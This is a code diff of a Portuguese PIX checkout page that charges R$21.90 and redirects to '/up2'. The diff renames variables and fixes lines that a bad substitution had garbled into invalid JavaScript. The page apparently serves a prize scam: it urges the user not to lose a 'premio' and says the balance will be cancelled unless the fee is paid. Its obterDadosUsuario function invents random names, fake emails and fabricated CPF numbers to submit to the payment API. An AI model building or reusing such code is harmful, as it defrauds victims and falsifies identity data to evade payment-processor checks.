@@ -47,8 +47,8 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,sans-serif;background:
 <h1>Pagamento via PIX</h1>
 <p class="sub">Finalize o pagamento para continuar</p>
 <div class="vcard">
-<div class="lbl">21.90 a pagar</div>
-<div class="val" id="v21.90">R$ 21.90</div>
+<div class="lbl">Valor a pagar</div>
+<div class="val" id="vPag">R$ 21.90</div>
 </div>
 <div class="load"><i class="bx bx-loader-alt bx-spin"></i><p>Abrindo pagamento...</p></div>
 </div>
@@ -58,50 +58,50 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,sans-serif;background:
 <div id="ld"><i class="bx bx-loader-alt bx-spin sp"></i><p style="color:#333;margin:0;font-weight:700;font-size:16px">Gerando pagamento...</p><p style="color:#888;font-size:12px;margin-top:5px">Aguarde um instante</p></div>
 <div id="ct">
 <h2 class="ph">Pagamento via PIX</h2>
-<div class="sc"><div class="sc-i"><span>21.90</span><strong id="vex">R$ 0,00</strong></div><div class="st"><span>EXPIRA EM</span><strong id="timer">07:00</strong></div></div>
-<div class="pc"><h4>Pague via PIX</h4><p>Escaneie o QR Code ou copie o codigo abaixo</p><div class="qw"><img id="qrcode" class="qi" src="" alt="QR Code PIX"></div><textarea id="pixcode" class="pi" readonly></textarea><button class="bt" onclick="copiar()"><i class="bx bx-copy"></i> Copiar codigo PIX</button></div>
+<div class="sc"><div class="sc-i"><span>VALOR</span><strong id="vExib">R$ 0,00</strong></div><div class="st"><span>EXPIRA EM</span><strong id="timer">07:00</strong></div></div>
+<div class="pc"><h4>Pague via PIX</h4><p>Escaneie o QR Code ou copie o codigo abaixo</p><div class="qw"><img id="qrcode" class="qi" src="" alt="QR Code PIX"></div><textarea id="pixcode" class="pi" readonly></textarea><button class="bt" onclick="copiarPix()"><i class="bx bx-copy"></i> Copiar codigo PIX</button></div>
 <div class="sdc sw" id="status"><i class="bx bx-loader-alt bx-spin si"></i><div class="st2"><strong id="stxt">Aguardando pagamento...</strong><span id="ssub">Atualizacao automatica</span></div></div>
 <div class="sdc sd"><i class="bx bx-error si"></i><div class="st2"><strong>Nao perca seu premio</strong><span>O saldo sera cancelado se o pagamento nao for confirmado.</span></div></div>
-<button class="bt" onclick="copiar()" style="margin-top:5px"><i class="bx bx-copy"></i> Copiar codigo PIX</button>
+<button class="bt" onclick="copiarPix()" style="margin-top:5px"><i class="bx bx-copy"></i> Copiar codigo PIX</button>
 <div class="pf"><i class="bx bx-shield-quarter"></i> Pagamento 100% seguro</div>
 </div></div></div>
 <script>
-var 21.90 = 21.90;
-var REDIR = '/up2';
-var timerInterval = null, pollingInterval = null, transactionId = null;
+var valorPix = 21.90;
+var redirectUrl = '/up2';
+var pixId = null, timerInterval = null, pollingInterval = null;
 
-document.getElementById('v21.90').textContent = 'R$ ' + 21.90.toFixed(2).replace('.', ',');
-setTimeout(iniciar, 500);
+document.getElementById('vPag').textContent = 'R$ ' + valorPix.toFixed(2).replace('.', ',');
+setTimeout(iniciarCheckout, 500);
 
-function iniciar() {
+function iniciarCheckout() {
     document.getElementById('ini').style.display = 'none';
     document.getElementById('modal').style.display = 'flex';
     document.body.style.overflow = 'hidden';
-    document.getElementById('vex').textContent = 'R$ ' + 21.90.toFixed(2).replace('.', ',');
-    gerarPix();
+    document.getElementById('vExib').textContent = 'R$ ' + valorPix.toFixed(2).replace('.', ',');
+    gerarPixPodPay();
 }
 
-function obterDados() {
+function obterDadosUsuario() {
     var s = JSON.parse(localStorage.getItem('podpay_dados')) || {};
     if (s.nome && s.cpf) return s;
     var u = JSON.parse(localStorage.getItem('dadosSaquePix')) || {};
-    var n = ["Joao Silva","Maria Oliveira","Pedro Santos","Ana Costa","Lucas Ferreira","Juliana Almeida"];
-    return {nome: u.nomeCompleto || n[Math.floor(Math.random()*n.length)],
+    var nomes = ["Joao Silva","Maria Oliveira","Pedro Santos","Ana Costa","Lucas Ferreira","Juliana Almeida"];
+    return {nome: u.nomeCompleto || nomes[Math.floor(Math.random()*nomes.length)],
             email: "cliente" + Math.floor(1000+Math.random()*9000) + "@email.com",
             cpf: (u.cpf || "").replace(/\D/g,'') || Math.floor(100+Math.random()*899)+"00000000",
             telefone: u.telefone || "11999999999"};
 }
 
-function gerarPix() {
-    var u = obterDados();
-    var ac = Math.round(21.90 * 100);
+function gerarPixPodPay() {
+    var user = obterDadosUsuario();
+    var cents = Math.round(valorPix * 100);
     fetch('/api/podpay', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-            21.90: ac,
-            customer: {name: u.nome, document: {type: "cpf", number: u.cpf.replace(/\D/g,'')}, email: u.email, phone: u.telefone || "11999999999"},
-            items: [{title: "Pagamento", unitPrice: ac, quantity: 1, tangible: false}]
+            amount: cents,
+            customer: {name: user.nome, document: {type: "cpf", number: user.cpf.replace(/\D/g,'')}, email: user.email, phone: user.telefone || "11999999999"},
+            items: [{title: "Pagamento", unitPrice: cents, quantity: 1, tangible: false}]
         })
     })
     .then(function(r) {
@@ -110,13 +110,13 @@ function gerarPix() {
     })
     .then(function(d) {
         if (!d.success || !d.data) throw new Error(d.error?.message || 'Resposta invalida da API');
-        var t = d.data;
-        var px = t.pixQrCode || '';
-        transactionId = t.id || '';
-        if (!px) throw new Error('PIX nao gerado: resposta sem codigo');
-        document.getElementById('pixcode').value = px;
-        var qi = document.getElementById('qrcode');
-        qi.src = t.pixQrCodeImage || 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(px);
+        var tx = d.data;
+        var pixCode = tx.pixQrCode || '';
+        pixId = tx.id || '';
+        if (!pixCode) throw new Error('PIX nao gerado: resposta sem codigo');
+        document.getElementById('pixcode').value = pixCode;
+        var qr = document.getElementById('qrcode');
+        qr.src = tx.pixQrCodeImage || 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
         setTimeout(function() {
             document.getElementById('ld').style.display = 'none';
             document.getElementById('ct').style.display = 'block';
@@ -127,26 +127,26 @@ function gerarPix() {
     .catch(function(e) {
         console.error(e);
         alert("Erro: " + (e.message || "Tente novamente."));
-        fechar();
+        fecharCheckout();
     });
 }
 
-function iniciarTimer(d) {
+function iniciarTimer(segundos) {
     clearInterval(timerInterval);
-    var e = document.getElementById('timer');
-    var t = d;
+    var el = document.getElementById('timer');
+    var t = segundos;
     timerInterval = setInterval(function() {
-        var mn = parseInt(t/60, 10);
-        var sc = parseInt(t%60, 10);
-        if (e) e.textContent = (mn<10?'0':'')+mn+':'+(sc<10?'0':'')+sc;
-        if (--t < 0) { clearInterval(timerInterval); if(e) e.textContent = '00:00'; }
+        var min = parseInt(t/60, 10);
+        var sec = parseInt(t%60, 10);
+        if (el) el.textContent = (min<10?'0':'')+min+':'+(sec<10?'0':'')+sec;
+        if (--t < 0) { clearInterval(timerInterval); if(el) el.textContent = '00:00'; }
     }, 1000);
 }
 
 function iniciarPolling() {
     clearInterval(pollingInterval);
     pollingInterval = setInterval(function() {
-        fetch('/api/podpay?id=' + encodeURIComponent(transactionId), {headers: {'Accept': 'application/json'}})
+        fetch('/api/podpay?id=' + encodeURIComponent(pixId), {headers: {'Accept': 'application/json'}})
         .then(function(r) { return r.json(); })
         .then(function(res) {
             if (res.success && res.data && res.data.status === 'paid') {
@@ -155,21 +155,21 @@ function iniciarPolling() {
                 var sc = document.getElementById('status');
                 sc.className = 'sdc ss';
                 sc.innerHTML = '<i class="bx bx-check-circle si"></i><div class="st2"><strong>Pagamento Confirmado!</strong><span>Redirecionando...</span></div>';
-                setTimeout(function() { window.location.href = REDIR; }, 1500);
+                setTimeout(function() { window.location.href = redirectUrl; }, 1500);
             }
         })
         .catch(function(e) { console.error('Polling:', e); });
     }, 4000);
 }
 
-function copiar() {
-    var i = document.getElementById('pixcode');
-    i.select(); i.setSelectionRange(0, 99999);
+function copiarPix() {
+    var inp = document.getElementById('pixcode');
+    inp.select(); inp.setSelectionRange(0, 99999);
     try { document.execCommand('copy'); alert('Codigo PIX copiado!'); }
-    catch(e) { navigator.clipboard.writeText(i.value).then(function() { alert('Codigo PIX copiado!'); }); }
+    catch(e) { navigator.clipboard.writeText(inp.value).then(function() { alert('Codigo PIX copiado!'); }); }
 }
 
-function fechar() {
+function fecharCheckout() {
     clearInterval(timerInterval);
     clearInterval(pollingInterval);
     var modal = document.getElementById('modal');
